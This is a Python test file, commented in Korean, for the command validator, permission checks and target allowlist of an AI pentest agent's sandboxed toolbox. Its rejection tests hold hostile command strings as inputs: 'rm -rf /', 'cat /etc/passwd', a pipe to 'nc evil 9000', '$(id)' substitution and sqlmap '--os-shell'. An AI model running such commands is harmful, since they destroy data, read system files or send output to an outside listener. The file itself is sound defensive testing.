"""보안 도구 실행 안전 핵심 — 명령 검증(toolbox) + 집행 결정(agent_tools.authorize) + 표적 인가 게이트.

전부 순수 로직이라 Docker/DB 없이 돈다. 공격 도구가 들어오는 경로의 1차 방어선이라 꼼꼼히 검증한다.
"""

from __future__ import annotations

import pytest
from fastapi import HTTPException

from app import agent_tools, pentest_tools, sandbox, toolbox
from app.agent_tools import ToolRegistry, ToolSpec
from app.config import Settings
from app.toolbox import CommandRejected


class _Res:
    def __init__(self, logs, exit_code=0, timed_out=False):
        self.logs = logs
        self.exit_code = exit_code
        self.timed_out = timed_out


def _patch_allowlist(monkeypatch, allow="test.internal,10.0.0.5", enabled=True):
    s = Settings(sandbox_enabled=enabled, sandbox_target_allowlist=allow)
    monkeypatch.setattr(toolbox, "settings", lambda: s)
    monkeypatch.setattr(sandbox, "settings", lambda: s)


# --------------------------------------------------------------- 표적 파싱/인가
def test_parse_target_url_and_hostport():
    assert toolbox.parse_target("http://test.internal/app?id=1") == ("test.internal", None)
    assert toolbox.parse_target("10.0.0.5:8080") == ("10.0.0.5", 8080)
    with pytest.raises(CommandRejected):
        toolbox.parse_target("")


def test_target_allowed_fail_closed(monkeypatch):
    _patch_allowlist(monkeypatch, allow="")       # 비면 전부 거부
    assert toolbox.target_allowed("http://test.internal") is False
    _patch_allowlist(monkeypatch)
    assert toolbox.target_allowed("http://test.internal/x") is True
    assert toolbox.target_allowed("https://evil.example") is False


def test_trusted_bypasses_allowlist_but_keeps_scope_lock(monkeypatch):
    """self-boot 표적(trusted)은 allowlist 에 없어도 통과하되, 명령 안 다른 host 는 여전히 거부."""
    _patch_allowlist(monkeypatch, allow="")       # allowlist 비어 있음(외부 경로라면 전부 거부)
    # trusted=False: 부팅 IP 가 allowlist 에 없어 거부
    with pytest.raises(CommandRejected) as ei:
        toolbox.validate_command("nmap -Pn 172.18.0.3", "172.18.0.3")
    assert ei.value.reason == "target_not_authorized"
    # trusted=True: self-boot 표적이라 allowlist 생략 → 통과
    argv = toolbox.validate_command("nmap -Pn 172.18.0.3", "172.18.0.3", trusted=True)
    assert argv[0] == "nmap"
    # trusted 라도 스코프 잠금은 유지 — 명령에 다른 host 가 섞이면 거부
    with pytest.raises(CommandRejected) as ei2:
        toolbox.validate_command("nmap 172.18.0.3 evil.example", "172.18.0.3", trusted=True)
    assert ei2.value.reason == "out_of_scope_host"


# --------------------------------------------------------------- 명령 검증
def test_validate_allows_recon_tool(monkeypatch):
    _patch_allowlist(monkeypatch)
    argv = toolbox.validate_command("nmap -sV test.internal", "test.internal")
    assert argv[0] == "nmap"


def test_validate_rejects_unknown_binary(monkeypatch):
    _patch_allowlist(monkeypatch)
    with pytest.raises(CommandRejected) as ei:
        toolbox.validate_command("rm -rf /", "test.internal")
    assert ei.value.reason == "tool_not_allowed"


def test_validate_rejects_shell_metachar(monkeypatch):
    _patch_allowlist(monkeypatch)
    for cmd in ("nmap test.internal; cat /etc/passwd", "nmap test.internal && whoami",
                "nmap test.internal | nc evil 9000", "nmap $(id) test.internal"):
        with pytest.raises(CommandRejected) as ei:
            toolbox.validate_command(cmd, "test.internal")
        assert ei.value.reason in ("shell_metachar", "forbidden_substr")


def test_validate_allows_ampersand_in_data_body(monkeypatch):
    """sqlmap --data 의 폼 바디 구분자 '&' 와 값의 '$' 는 셸 메타로 오거부되면 안 된다(argv 실행)."""
    _patch_allowlist(monkeypatch)
    argv = toolbox.validate_command(
        'sqlmap -u "http://test.internal/api/v1/auth/signup" '
        '--data="email=1&password=1&name=1" --batch --level=2 --risk=2',
        "http://test.internal")
    assert argv[0] == "sqlmap"
    assert "--data=email=1&password=1&name=1" in argv
    # 단독 '$' 가 값에 있어도 통과(치환 '$(' '${' 만 거부)
    argv2 = toolbox.validate_command(
        'sqlmap -u "http://test.internal/x?id=1" --data="pw=a$b" --batch', "http://test.internal")
    assert argv2[0] == "sqlmap"


def test_validate_still_rejects_chaining_and_substitution(monkeypatch):
    """단독 '&'/'$' 허용 뒤에도 연쇄('&&' '||')·치환('$(' '${')·파이프는 계속 거부."""
    _patch_allowlist(monkeypatch)
    for cmd in ('sqlmap -u "http://test.internal/x" --data="a=1" && whoami',
                'sqlmap -u "http://test.internal/x" --data="a=1" || id',
                'sqlmap -u "http://test.internal/x" --data="a=${IFS}"',
                'nmap test.internal | nc evil 9000'):
        with pytest.raises(CommandRejected) as ei:
            toolbox.validate_command(cmd, "http://test.internal")
        assert ei.value.reason == "shell_metachar"


def test_validate_rejects_exploit_flags(monkeypatch):
    _patch_allowlist(monkeypatch)
    with pytest.raises(CommandRejected) as ei:
        toolbox.validate_command("sqlmap -u http://test.internal/x?id=1 --os-shell", "test.internal")
    assert ei.value.reason == "forbidden_flag"


def test_validate_rejects_out_of_scope_host(monkeypatch):
    _patch_allowlist(monkeypatch)
    with pytest.raises(CommandRejected) as ei:
        toolbox.validate_command("nmap -sV evil.example", "test.internal")
    assert ei.value.reason in ("out_of_scope_host", "target_not_authorized")


def test_validate_rejects_unauthorized_target(monkeypatch):
    _patch_allowlist(monkeypatch)
    with pytest.raises(CommandRejected) as ei:
        toolbox.validate_command("nmap -sV other.internal", "other.internal")
    assert ei.value.reason == "target_not_authorized"


def test_is_destructive_classification():
    assert toolbox.is_destructive("sqlmap -u http://x/?id=1 --batch") is True
    assert toolbox.is_destructive("nmap -sV x") is False


# --------------------------------------------------------------- 집행 결정(authorize)
def _read_spec():
    return ToolSpec(name="r", description="", params={}, kind="read", handler=lambda *a: None)


def _exec_spec(**kw):
    base = dict(name="terminal", description="", params={}, kind="exec", handler=lambda *a: None,
                min_role="manager")
    base.update(kw)
    return ToolSpec(**base)


def test_read_tool_always_allowed():
    d = agent_tools.authorize(_read_spec(), permission_mode="plan", effective_role="viewer")
    assert d.allowed and not d.needs_approval


def test_plan_mode_blocks_exec():
    d = agent_tools.authorize(_exec_spec(), permission_mode="plan", effective_role="owner")
    assert not d.allowed and d.reason == "plan_mode_no_exec"


def test_insufficient_role_denied_even_with_approval():
    d = agent_tools.authorize(_exec_spec(), permission_mode="auto", effective_role="developer",
                              approved=True)
    assert not d.allowed and d.reason == "insufficient_role" and not d.needs_approval


def test_ask_mode_requires_approval():
    d = agent_tools.authorize(_exec_spec(), permission_mode="ask", effective_role="manager")
    assert not d.allowed and d.needs_approval and d.reason == "approval_required"
    d2 = agent_tools.authorize(_exec_spec(), permission_mode="ask", effective_role="manager",
                               approved=True)
    assert d2.allowed


def test_auto_allows_nondestructive_but_approves_destructive():
    # auto + 비파괴 명령 → 바로 실행
    spec = _exec_spec(destructive_fn=lambda p: toolbox.is_destructive(p.get("command", "")))
    d = agent_tools.authorize(spec, permission_mode="auto", effective_role="manager",
                              params={"command": "nmap -sV test.internal"})
    assert d.allowed
    # auto + 파괴 명령(sqlmap) → auto 라도 승인 필요(하드 가드)
    d2 = agent_tools.authorize(spec, permission_mode="auto", effective_role="manager",
                               params={"command": "sqlmap -u http://test.internal/?id=1 --batch"})
    assert not d2.allowed and d2.needs_approval


# --------------------------------------------------------------- 표적 인가 게이트(assert)
class _Cur:
    def __init__(self):
        self.audits = []

    def execute(self, sql, params=None):
        if "audit" in sql.lower() or "pg_notify" in sql.lower():
            self.audits.append((sql, params))

    def fetchone(self):
        return {"seq": 1}


def test_assert_target_rejects_unauthorized(monkeypatch):
    _patch_allowlist(monkeypatch)
    cur = _Cur()
    with pytest.raises(HTTPException) as ei:
        sandbox.assert_target_allowed(cur, "https://evil.example", actor="user:1")
    assert ei.value.status_code == 403 and ei.value.detail == "target_not_authorized"
    assert cur.audits, "거부는 audit 에 남아야 한다"


def test_assert_target_allows_authorized(monkeypatch):
    _patch_allowlist(monkeypatch)
    cur = _Cur()
    assert sandbox.assert_target_allowed(cur, "http://test.internal/app", actor="user:1") == "test.internal"


def test_assert_target_rejects_when_disabled(monkeypatch):
    _patch_allowlist(monkeypatch, enabled=False)
    cur = _Cur()
    with pytest.raises(HTTPException) as ei:
        sandbox.assert_target_allowed(cur, "http://test.internal", actor="user:1")
    assert ei.value.status_code == 409 and ei.value.detail == "sandbox_disabled"


# --------------------------------------------------------------- 툴박스 컨테이너 보안 기본값
def test_toolbox_container_enforces_security_defaults():
    from worker.sandbox.dind import _toolbox_kwargs

    kw = _toolbox_kwargs("vxcontrol/kali-linux", "neosdl-sbx-net-x", "eng1")
    assert kw["privileged"] is False                   # privileged 는 절대 아님
    assert kw["cap_drop"] == ["ALL"]
    # 네트워크 도구용 cap 만 추가(fscap 바이너리 실행). no-new-privileges 는 툴박스에서 해제.
    assert "NET_RAW" in kw["cap_add"] and "NET_ADMIN" in kw["cap_add"]
    assert "security_opt" not in kw
    assert kw["user"] == "1000:1000"                   # 기본 비root
    assert kw["read_only"] is True and kw["pids_limit"] == 512
    assert kw["command"] == ["sleep", "infinity"]      # idle — 명령은 exec_run
    assert kw["labels"]["neosdl.role"] == "toolbox"
    assert "volumes" not in kw and "binds" not in kw   # 바인드마운트 없음


# --------------------------------------------------------------- terminal 툴 핸들러
def test_terminal_handler_runs_validated_command(monkeypatch):
    _patch_allowlist(monkeypatch)
    monkeypatch.setattr(pentest_tools.audit, "record", lambda *a, **k: None)
    calls = {}

    def fake_exec(argv):
        calls["argv"] = argv
        return _Res("Nmap scan report for test.internal\n22/tcp open ssh")

    ctx = {"target": "test.internal", "toolbox_exec": fake_exec, "actor": "user:1"}
    out = pentest_tools.terminal_handler(None, ctx, {"command": "nmap -sV test.internal"})
    assert out["ok"] is True and calls["argv"][0] == "nmap"
    assert "22/tcp open ssh" in out["output"]


def test_terminal_handler_rejects_bad_command(monkeypatch):
    _patch_allowlist(monkeypatch)
    recorded = {}
    monkeypatch.setattr(pentest_tools.audit, "record",
                        lambda cur, **k: recorded.update(k))
    ctx = {"target": "test.internal", "toolbox_exec": lambda a: _Res(""), "actor": "user:1"}
    out = pentest_tools.terminal_handler(None, ctx, {"command": "nmap test.internal; rm -rf /"})
    assert out["ok"] is False and out["error"] in ("shell_metachar", "forbidden_substr")
    assert recorded.get("action") == "terminal.rejected"


def test_terminal_handler_no_toolbox_is_explicit(monkeypatch):
    _patch_allowlist(monkeypatch)
    monkeypatch.setattr(pentest_tools.audit, "record", lambda *a, **k: None)
    ctx = {"target": "test.internal", "toolbox_exec": None, "actor": "user:1"}
    out = pentest_tools.terminal_handler(None, ctx, {"command": "nmap -sV test.internal"})
    assert out["ok"] is False and out["error"] == "no_toolbox"


def test_register_adds_exec_terminal_tool():
    reg = ToolRegistry()
    pentest_tools.register(reg)
    spec = reg.get("terminal")
    assert spec is not None and spec.kind == "exec" and spec.min_role == "manager"
    assert spec.is_destructive({"command": "sqlmap -u http://x/?id=1 --batch"}) is True
    assert spec.is_destructive({"command": "nmap -sV x"}) is False
